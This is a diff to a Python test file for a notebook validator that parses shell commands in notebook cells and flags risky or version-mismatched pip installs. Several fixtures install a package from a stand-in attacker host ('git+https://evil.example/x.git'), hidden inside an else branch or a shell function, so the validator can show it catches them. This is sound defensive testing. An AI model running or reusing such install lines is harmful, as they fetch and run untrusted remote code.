@@ -1077,12 +1077,23 @@ def test_notebook_validator_keeps_a_pip_call_used_as_a_test():
     ):
         assert len(nv.rule_inst_004_torchcodec_torch(cell, older, "nb.ipynb", 0)) == 1, cell
 
-    # The bodies stay conditional.
-    for cell in (
-        '!if command -v uv; then pip install "torch==2.12.0"; fi',
-        '!while true; do pip install "torch==2.12.0"; done',
-    ):
-        assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], cell
+    # A body under an UNKNOWN test stays conditional.
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            '!if command -v uv; then pip install "torch==2.12.0"; fi',
+            COLAB_TORCH211,
+            "nb.ipynb",
+            0,
+        )
+        == []
+    )
+    # `while true` loops forever, so its body is reached as surely as a bare command.
+    assert [
+        f.rule
+        for f in nv.rule_inst_004_torchcodec_torch(
+            '!while true; do pip install "torch==2.12.0"; done', COLAB_TORCH211, "nb.ipynb", 0
+        )
+    ] == ["R-INST-004"]
 
 
 def test_git_ban_only_reads_pip_commands():
@@ -3457,13 +3468,15 @@ def test_a_compound_body_stays_conditional_past_its_separators():
         ("!pip install a", True),
         ("!pip install b", False),
     ]
+    # The replay models pip as succeeding, the same assumption `pip install a && pip install b`
+    # rests on, so the body of a pip test is reached.
     assert nv._split_chained("!if pip install a; then pip install b; fi") == [
         ("!pip install a", False),
-        ("!pip install b", True),
+        ("!pip install b", False),
     ]
     # `while`/`do`/`done` carries the same way.
     assert [
-        flag for _, flag in nv._split_chained("!while true; do pip install a; pip install b; done")
+        flag for _, flag in nv._split_chained("!while maybe; do pip install a; pip install b; done")
     ] == [False, True, True]
 
 
@@ -4108,3 +4121,86 @@ def test_an_exclusive_floor_is_kept_as_an_inexact_bound():
         "2.11",
         False,
     )
+
+
+def test_a_known_branch_outcome_decides_which_body_is_replayed():
+    """A constant test names the branch that runs, and it is not always the `then` one.
+
+    Verified against bash: `if true; then echo BODY; fi` prints, and
+    `if false; then :; else echo ELSE; fi` prints. Reading every started body as merely
+    conditional dropped an install that always runs; reading a false one as unreachable
+    without inverting it for `else` dropped the branch that does, and R-INST-001 went blind
+    on a git source in it.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations("!if true; then pip install torch==2.12.0; fi")
+    ] == [("install", ["torch==2.12.0"])]
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!pip install safe; if false; then :; else pip install git+https://evil.example/x.git; fi",
+            "nb.ipynb",
+            0,
+        )
+    ] == ["R-INST-001"]
+    # A known-true test takes its `then` branch, so the `else` is the unreachable one.
+    assert nv._split_chained("!if true; then pip install a; else pip install b; fi") == [
+        ("!true", False),
+        ("!pip install a", False),
+    ]
+    # An unknown test leaves both branches conditional, and `elif` reaches neither outcome.
+    assert nv._split_chained("!if maybe; then pip install a; else pip install b; fi") == [
+        ("!maybe", False),
+        ("!pip install a", True),
+        ("!pip install b", True),
+    ]
+    assert nv._split_chained("!if false; then pip install a; elif maybe; then pip install b; fi") == [
+        ("!false", False),
+        ("!maybe", True),
+        ("!pip install b", True),
+    ]
+
+
+def test_an_exclusion_fallback_stays_inside_the_whole_window():
+    """The landing is read off the ceiling alone, so the rest of the window still binds it.
+
+    `torchcodec<=0.10.0,!=0.10.0,<0.12` can only resolve below 0.10, but the ceiling's 0.11
+    was handed back as exact and R-INST-004 accepted a pairing pip never installs.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._effective_version(
+        '!pip install "torchcodec<=0.10.0,!=0.10.0,<0.12"', "torchcodec", "0.10.0+cu128"
+    ) == (None, True)
+    # A landing the window really admits is still used.
+    for spec in ("torchcodec>=0.11,<0.12,!=0.11.0", "torchcodec>=0.10,<0.12,!=0.10.0"):
+        assert nv._effective_version(f'!pip install "{spec}"', "torchcodec", "0.10.0+cu128") == (
+            "0.11",
+            True,
+        ), spec
+
+
+def test_a_shell_function_body_is_not_hidden_behind_its_name():
+    """`setup() { pip install ...; }` kept its name in front of the body, so no rule saw it.
+
+    This regressed the raw-line scan on main, which caught the git source. The body is exposed
+    as conditional -- it runs only when the function is called -- which is what R-INST-001
+    reads.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = "!pip install safe; setup_audio() { pip install git+https://evil.example/x.git; }; setup_audio"
+    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
+    # Conditional, so it never fabricates a version the notebook is claimed to install.
+    assert list(nv.unconditional_pip_invocations(cell))[0].packages == ["safe"]
+    for spelling in (
+        "!setup () { pip install a; }; setup",
+        "!function setup { pip install a; }; setup",
+        "!function setup () { pip install a; }; setup",
+    ):
+        assert ("!pip install a", True) in nv._split_chained(spelling), spelling
+    # Empty parens are required, so a grouped command and a substitution are untouched.
+    assert nv._split_chained("!X=$(pip install a)") == [("!pip install a", False)]
